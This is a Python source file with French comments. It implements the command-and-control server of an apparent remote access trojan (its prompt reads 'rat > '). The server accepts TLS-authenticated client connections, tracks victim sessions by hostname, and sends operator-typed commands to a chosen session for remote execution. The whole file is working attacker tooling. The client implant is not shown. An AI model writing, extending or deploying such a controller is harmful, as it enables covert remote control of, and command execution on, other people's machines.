# écouter sur un port
# accepter connexions
# lancer threads

import socket
import ssl
from threading import Thread
from utils.logger import setup_logger
import json
from server.sessions import SessionManager
import os

logger = setup_logger()


class SSLServer:

    def __init__(
        self,
        host,
        port,
        server_cert,
        server_key,
        client_cert,
        chunk_size=4096,
    ):

        self.host = host
        self.port = port
        self.chunk_size = chunk_size

        self.sessions = SessionManager()

        # SSL context
        self._context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)

        self._context.verify_mode = ssl.CERT_REQUIRED

        self._context.load_cert_chain(
            server_cert,
            server_key,
        )

        self._context.load_verify_locations(client_cert)

    def start(self):

        with socket.socket(
            socket.AF_INET,
            socket.SOCK_STREAM,
        ) as sock:

            sock.setsockopt(
                socket.SOL_SOCKET,
                socket.SO_REUSEADDR,
                1,
            )

            sock.bind(
                (
                    self.host,
                    self.port,
                )
            )

            sock.listen(100)

            logger.info(
                "Server listening on %s:%s",
                self.host,
                self.port,
            )

            print("Server listening")

            # lancer command loop dans thread séparé
            Thread(
                target=self.command_loop,
                daemon=True,
            ).start()

            while True:

                conn, addr = sock.accept()

                try:

                    sconn = self._context.wrap_socket(
                        conn,
                        server_side=True,
                    )

                    logger.info(
                        "Client connected: %s",
                        addr[0],
                    )

                    data = sconn.recv(self.chunk_size)

                    if not data:

                        logger.warning("Client disconnected before sending info")

                        sconn.close()

                        continue

                    client_info = json.loads(data.decode())

                    session_id = self.sessions.add(
                        sconn,
                        client_info,
                    )

                    logger.info(
                        "New session %s for %s",
                        session_id,
                        client_info["hostname"],
                    )

                    print(
                        f"[+] Session {session_id} opened "
                        f"({client_info['hostname']})"
                    )

                    Thread(
                        target=self._client_receiver,
                        args=(
                            sconn,
                            session_id,
                        ),
                        daemon=True,
                    ).start()

                except ssl.SSLError:

                    logger.error("SSL handshake failed")

    def _client_receiver(
        self,
        sock,
        session_id,
    ):

        try:

            while True:

                data = sock.recv(self.chunk_size)

                if not data:

                    logger.warning(
                        "Client %s disconnected",
                        session_id,
                    )

                    print(f"\n[-] Session " f"{session_id} disconnected")

                    break

                response = data.decode(errors="ignore")

                print(f"\n[{session_id}] " f"{response}")

                print(
                    "rat > ",
                    end="",
                    flush=True,
                )

        except (
            ConnectionResetError,
            BrokenPipeError,
        ):

            logger.warning(
                "Connection lost: %s",
                session_id,
            )

        finally:

            self.sessions.remove(session_id)

            sock.close()

    def command_loop(self):

        while True:

            try:

                command = input("rat > ").strip()

                if not command:

                    continue

                if command == "exit":

                    print("Bye")

                    os._exit(0)

                # lister les sessions

                if command == "sessions":

                    self.sessions.list_sessions()

                    continue

                # interact

                if command.startswith("interact"):

                    try:

                        sid = int(command.split()[1])

                        if sid not in self.sessions.sessions:

                            print("Session not found")

                            continue

                        self.sessions.current_session = sid

                        print(f"Now interacting with {sid}")

                    except (
                        IndexError,
                        ValueError,
                    ):

                        print("Usage: interact <id>")

                    continue

                # vérifier session active

                if self.sessions.current_session is None:

                    print("No session selected")

                    continue

                session = self.sessions.sessions.get(self.sessions.current_session)

                if not session:

                    print("Session not found")

                    continue

                sock = session["socket"]

                try:

                    sock.sendall(command.encode())

                    logger.info(
                        "Command sent to %s: %s",
                        self.sessions.current_session,
                        command,
                    )

                except Exception:

                    print("Failed to send command")

                    self.sessions.remove(self.sessions.current_session)

                    self.sessions.current_session = None

            except KeyboardInterrupt:

                print()

                continue


class SSLServerThread(Thread):

    def __init__(
        self,
        server,
    ):

        super().__init__()

        self._server = server

        self.daemon = True

    def run(self):

        self._server.start()
